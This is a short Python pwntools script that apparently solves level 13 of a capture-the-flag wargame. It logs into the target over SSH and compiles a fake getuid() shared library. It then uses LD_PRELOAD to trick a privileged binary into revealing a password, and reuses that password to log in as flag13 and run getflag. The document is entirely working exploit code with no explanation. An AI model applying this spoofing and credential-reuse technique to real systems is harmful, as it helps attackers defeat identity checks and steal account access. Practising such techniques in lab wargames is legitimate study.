#!/usr/bin/python3

from pwn import *
from sys import argv,exit

if len(argv) < 2:
	sys.exit("Target IP Missing") 

level13 = ssh(host=argv[1],user='level13',password='level13')
level13_shell = level13.shell('sh')
level13_shell.sendline("cp /home/flag13/flag13 /tmp/flag13")
level13_shell.sendline('echo -e "#include <stdio.h>\\ngetuid() {\\n\\treturn 1000;\\n}" > /tmp/getuid.c')
level13_shell.sendline('gcc /tmp/getuid.c -shared -o /tmp/fakeuid.so')
level13_shell.sendline('export LD_PRELOAD="/tmp/fakeuid.so"')
level13_shell.sendline('/tmp/flag13 > /tmp/pass')
password = (level13.download_data('/tmp/pass')).decode()[14:-1]
level13_shell.kill()
level13.close()
log.success(f'Got flag13 password : {password}')
flag13 = ssh(host=argv[1],user='flag13',password=password)
flag13_shell = flag13.shell('sh')
flag13_shell.sendline("getflag")
flag13_shell.interactive(prompt="")